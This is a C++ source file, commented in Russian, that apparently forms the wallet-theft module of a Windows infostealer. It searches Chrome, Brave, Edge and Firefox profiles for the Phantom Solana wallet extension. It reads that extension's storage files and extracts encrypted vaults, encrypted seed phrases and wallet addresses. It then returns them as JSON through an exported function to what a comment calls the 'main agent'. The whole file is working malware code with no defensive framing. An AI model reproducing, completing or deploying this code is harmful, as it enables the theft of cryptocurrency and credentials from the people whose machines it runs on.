#include <windows.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <sstream>
#include <fstream>
#include "../common.h"
#include "../logger/file_logger.h"

class PhantomWalletExtractor {
private:
    struct PhantomWallet {
        std::string browser;
        std::string profile;
        std::vector<std::string> vaults;
        std::vector<std::string> solanaAddresses;
        bool hasVault;
        std::string encryptedSeed;
    };
    
    std::vector<PhantomWallet> wallets;
    
    // Phantom extension IDs для разных браузеров
    const std::string PHANTOM_CHROME_ID = "bfnaelmomeimhlpmgjnjophhpkkoljpa";
    const std::string PHANTOM_FIREFOX_ID = "phantom-wallet@phantom.app";
    const std::string PHANTOM_EDGE_ID = "bfnaelmomeimhlpmgjnjophhpkkoljpa";
    
public:
    PhantomWalletExtractor() {
        FindPhantomWallets();
    }
    
    std::string ExtractAll() {
        std::stringstream json;
        json << "{";
        json << "\"wallet_type\":\"phantom\",";
        json << "\"blockchain\":\"solana\",";
        json << "\"wallets\":[";
        
        bool first = true;
        for (const auto& wallet : wallets) {
            if (!first) json << ",";
            first = false;
            
            json << "{";
            json << "\"browser\":\"" << wallet.browser << "\",";
            json << "\"profile\":\"" << wallet.profile << "\",";
            json << "\"has_vault\":" << (wallet.hasVault ? "true" : "false") << ",";
            json << "\"addresses_count\":" << wallet.solanaAddresses.size() << ",";
            
            // Добавляем vault данные (зашифрованные)
            json << "\"vaults\":[";
            bool firstVault = true;
            for (const auto& vault : wallet.vaults) {
                if (!firstVault) json << ",";
                firstVault = false;
                json << "\"" << EscapeJson(vault) << "\"";
            }
            json << "],";
            
            // Добавляем Solana адреса
            json << "\"solana_addresses\":[";
            bool firstAddr = true;
            for (const auto& address : wallet.solanaAddresses) {
                if (!firstAddr) json << ",";
                firstAddr = false;
                json << "\"" << address << "\"";
            }
            json << "],";
            
            // Зашифрованный seed (если найден)
            json << "\"encrypted_seed\":\"" << EscapeJson(wallet.encryptedSeed) << "\"";
            
            json << "}";
        }
        
        json << "]}";
        return json.str();
    }
    
private:
    void FindPhantomWallets() {
        // Ищем Phantom в Chrome
        CheckChromePhantom();
        
        // Ищем Phantom в Firefox
        CheckFirefoxPhantom();
        
        // Ищем Phantom в Brave
        CheckBravePhantom();
        
        // Ищем Phantom в Edge
        CheckEdgePhantom();
    }
    
    void CheckChromePhantom() {
        WCHAR localAppData[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) {
            std::wstring basePath = std::wstring(localAppData) + L"\\Google\\Chrome\\User Data";
            
            std::vector<std::wstring> profiles = {L"Default", L"Profile 1", L"Profile 2", L"Profile 3"};
            
            for (const auto& profile : profiles) {
                std::wstring extensionPath = basePath + L"\\" + profile + L"\\Local Extension Settings\\" + 
                                           Utils::StringToWString(PHANTOM_CHROME_ID);
                
                if (Utils::DirectoryExists(extensionPath)) {
                    PhantomWallet wallet;
                    wallet.browser = "chrome";
                    wallet.profile = Utils::WStringToString(profile);
                    
                    ExtractLevelDBData(extensionPath, wallet);
                    
                    if (wallet.hasVault || !wallet.solanaAddresses.empty()) {
                        wallets.push_back(wallet);
                    }
                }
            }
        }
    }
    
    void CheckFirefoxPhantom() {
        WCHAR appData[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData))) {
            std::wstring firefoxPath = std::wstring(appData) + L"\\Mozilla\\Firefox\\Profiles";
            
            WIN32_FIND_DATAW findData;
            std::wstring searchPath = firefoxPath + L"\\*";
            
            HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                        std::wstring dirName = findData.cFileName;
                        if (dirName != L"." && dirName != L"..") {
                            std::wstring profilePath = firefoxPath + L"\\" + dirName;
                            CheckFirefoxExtensionStorage(profilePath, dirName);
                        }
                    }
                } while (FindNextFileW(hFind, &findData));
                FindClose(hFind);
            }
        }
    }
    
    void CheckBravePhantom() {
        WCHAR localAppData[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) {
            std::wstring basePath = std::wstring(localAppData) + L"\\BraveSoftware\\Brave-Browser\\User Data";
            
            std::vector<std::wstring> profiles = {L"Default", L"Profile 1", L"Profile 2"};
            
            for (const auto& profile : profiles) {
                std::wstring extensionPath = basePath + L"\\" + profile + L"\\Local Extension Settings\\" + 
                                           Utils::StringToWString(PHANTOM_CHROME_ID);
                
                if (Utils::DirectoryExists(extensionPath)) {
                    PhantomWallet wallet;
                    wallet.browser = "brave";
                    wallet.profile = Utils::WStringToString(profile);
                    
                    ExtractLevelDBData(extensionPath, wallet);
                    
                    if (wallet.hasVault || !wallet.solanaAddresses.empty()) {
                        wallets.push_back(wallet);
                    }
                }
            }
        }
    }
    
    void CheckEdgePhantom() {
        WCHAR localAppData[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) {
            std::wstring basePath = std::wstring(localAppData) + L"\\Microsoft\\Edge\\User Data";
            
            std::vector<std::wstring> profiles = {L"Default", L"Profile 1", L"Profile 2"};
            
            for (const auto& profile : profiles) {
                std::wstring extensionPath = basePath + L"\\" + profile + L"\\Local Extension Settings\\" + 
                                           Utils::StringToWString(PHANTOM_EDGE_ID);
                
                if (Utils::DirectoryExists(extensionPath)) {
                    PhantomWallet wallet;
                    wallet.browser = "edge";
                    wallet.profile = Utils::WStringToString(profile);
                    
                    ExtractLevelDBData(extensionPath, wallet);
                    
                    if (wallet.hasVault || !wallet.solanaAddresses.empty()) {
                        wallets.push_back(wallet);
                    }
                }
            }
        }
    }
    
    void ExtractLevelDBData(const std::wstring& dbPath, PhantomWallet& wallet) {
        // Ищем .ldb и .log файлы
        WIN32_FIND_DATAW findData;
        std::wstring searchPath = dbPath + L"\\*.ldb";
        
        HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                std::wstring filePath = dbPath + L"\\" + findData.cFileName;
                ExtractDataFromFile(filePath, wallet);
            } while (FindNextFileW(hFind, &findData));
            FindClose(hFind);
        }
        
        // Также проверяем .log файлы
        searchPath = dbPath + L"\\*.log";
        hFind = FindFirstFileW(searchPath.c_str(), &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                std::wstring filePath = dbPath + L"\\" + findData.cFileName;
                ExtractDataFromFile(filePath, wallet);
            } while (FindNextFileW(hFind, &findData));
            FindClose(hFind);
        }
    }
    
    void ExtractDataFromFile(const std::wstring& filePath, PhantomWallet& wallet) {
        HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ,
                                  FILE_SHARE_READ | FILE_SHARE_WRITE,
                                  NULL, OPEN_EXISTING, 0, NULL);
        
        if (hFile == INVALID_HANDLE_VALUE) return;
        
        LARGE_INTEGER fileSize;
        GetFileSizeEx(hFile, &fileSize);
        
        // Ограничиваем размер файла
        if (fileSize.QuadPart > 10 * 1024 * 1024) { // 10MB limit
            CloseHandle(hFile);
            return;
        }
        
        std::vector<char> buffer((size_t)fileSize.QuadPart);
        DWORD bytesRead;
        ReadFile(hFile, buffer.data(), (DWORD)buffer.size(), &bytesRead, NULL);
        CloseHandle(hFile);
        
        std::string content(buffer.begin(), buffer.end());
        
        // Ищем vault данные Phantom
        size_t vaultPos = content.find("_localStorage");
        if (vaultPos != std::string::npos) {
            // Извлекаем данные vault
            size_t start = content.find("{", vaultPos);
            if (start != std::string::npos) {
                int braceCount = 1;
                size_t end = start + 1;
                
                while (braceCount > 0 && end < content.length()) {
                    if (content[end] == '{') braceCount++;
                    else if (content[end] == '}') braceCount--;
                    end++;
                }
                
                if (braceCount == 0) {
                    std::string vaultData = content.substr(start, end - start);
                    wallet.vaults.push_back(vaultData);
                    wallet.hasVault = true;
                }
            }
        }
        
        // Ищем зашифрованные seed фразы
        size_t seedPos = content.find("encryptedMnemonic");
        if (seedPos != std::string::npos) {
            size_t start = content.find("\"", seedPos + 17);
            if (start != std::string::npos) {
                start++;
                size_t end = content.find("\"", start);
                if (end != std::string::npos) {
                    wallet.encryptedSeed = content.substr(start, end - start);
                }
            }
        }
        
        // Ищем Solana адреса (начинаются с букв и цифр, длина обычно 32-44 символа)
        size_t pos = 0;
        while (pos < content.length()) {
            // Ищем потенциальные Solana адреса
            if (pos + 32 <= content.length()) {
                std::string potentialAddress = content.substr(pos, 44);
                if (IsValidSolanaAddress(potentialAddress)) {
                    // Проверяем, что этот адрес еще не добавлен
                    bool found = false;
                    for (const auto& addr : wallet.solanaAddresses) {
                        if (addr == potentialAddress) {
                            found = true;
                            break;
                        }
                    }
                    if (!found) {
                        wallet.solanaAddresses.push_back(potentialAddress);
                    }
                }
            }
            pos++;
        }
    }
    
    void CheckFirefoxExtensionStorage(const std::wstring& profilePath, const std::wstring& profileName) {
        std::wstring storagePath = profilePath + L"\\storage\\default\\moz-extension+++";
        
        WIN32_FIND_DATAW findData;
        std::wstring searchPath = storagePath + L"*";
        
        HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    std::wstring dirName = findData.cFileName;
                    if (dirName != L"." && dirName != L"..") {
                        // Проверяем, может ли это быть Phantom
                        std::wstring idbPath = storagePath + dirName + L"\\idb";
                        if (Utils::DirectoryExists(idbPath)) {
                            PhantomWallet wallet;
                            wallet.browser = "firefox";
                            wallet.profile = Utils::WStringToString(profileName);
                            
                            ExtractFirefoxIndexedDB(idbPath, wallet);
                            
                            if (wallet.hasVault || !wallet.solanaAddresses.empty()) {
                                wallets.push_back(wallet);
                            }
                        }
                    }
                }
            } while (FindNextFileW(hFind, &findData));
            FindClose(hFind);
        }
    }
    
    void ExtractFirefoxIndexedDB(const std::wstring& idbPath, PhantomWallet& wallet) {
        WIN32_FIND_DATAW findData;
        std::wstring searchPath = idbPath + L"\\*.sqlite";
        
        HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                std::wstring filePath = idbPath + L"\\" + findData.cFileName;
                
                HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ,
                                          FILE_SHARE_READ | FILE_SHARE_WRITE,
                                          NULL, OPEN_EXISTING, 0, NULL);
                
                if (hFile != INVALID_HANDLE_VALUE) {
                    LARGE_INTEGER fileSize;
                    GetFileSizeEx(hFile, &fileSize);
                    
                    if (fileSize.QuadPart < 10 * 1024 * 1024) { // 10MB limit
                        std::vector<char> buffer((size_t)fileSize.QuadPart);
                        DWORD bytesRead;
                        ReadFile(hFile, buffer.data(), (DWORD)buffer.size(), &bytesRead, NULL);
                        
                        std::string content(buffer.begin(), buffer.end());
                        
                        // Ищем паттерны Phantom
                        if (content.find("phantom") != std::string::npos ||
                            content.find("solana") != std::string::npos) {
                            wallet.hasVault = true;
                        }
                        
                        // Извлекаем Solana адреса
                        size_t pos = 0;
                        while (pos < content.length()) {
                            if (pos + 32 <= content.length()) {
                                std::string potentialAddress = content.substr(pos, 44);
                                if (IsValidSolanaAddress(potentialAddress)) {
                                    bool found = false;
                                    for (const auto& addr : wallet.solanaAddresses) {
                                        if (addr == potentialAddress) {
                                            found = true;
                                            break;
                                        }
                                    }
                                    if (!found) {
                                        wallet.solanaAddresses.push_back(potentialAddress);
                                    }
                                }
                            }
                            pos++;
                        }
                    }
                    
                    CloseHandle(hFile);
                }
            } while (FindNextFileW(hFind, &findData));
            FindClose(hFind);
        }
    }
    
    bool IsValidSolanaAddress(const std::string& address) {
        // Solana адреса обычно имеют длину 32-44 символа и состоят из Base58 символов
        if (address.length() < 32 || address.length() > 44) {
            return false;
        }
        
        // Base58 символы (без 0, O, I, l)
        const std::string base58Chars = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
        
        for (char c : address) {
            if (base58Chars.find(c) == std::string::npos) {
                return false;
            }
        }
        
        // Дополнительная проверка - Solana адреса часто начинаются с определенных символов
        return true;
    }
    
    std::string EscapeJson(const std::string& str) {
        std::string result;
        for (char c : str) {
            switch (c) {
                case '"': result += "\\\""; break;
                case '\\': result += "\\\\"; break;
                case '\b': result += "\\b"; break;
                case '\f': result += "\\f"; break;
                case '\n': result += "\\n"; break;
                case '\r': result += "\\r"; break;
                case '\t': result += "\\t"; break;
                default:
                    if (c >= 0x20 && c <= 0x7E) {
                        result += c;
                    } else {
                        char buf[7];
                        snprintf(buf, sizeof(buf), "\\u%04x", (unsigned char)c);
                        result += buf;
                    }
            }
        }
        return result;
    }
};

// Экспортная функция для основного агента
extern "C" {
    const char* ExtractPhantomData() {
        static std::string result;
        
        try {
            PhantomWalletExtractor extractor;
            result = extractor.ExtractAll();
            
            extern void LogInfo(const char*);
            LogInfo("Извлечение данных Phantom кошелька завершено");
            
            return result.c_str();
        } catch (...) {
            extern void LogError(const char*);
            LogError("Не удалось извлечь данные Phantom кошелька");
            
            result = "{\"wallet_type\":\"phantom\",\"wallets\":[]}";
            return result.c_str();
        }
    }
}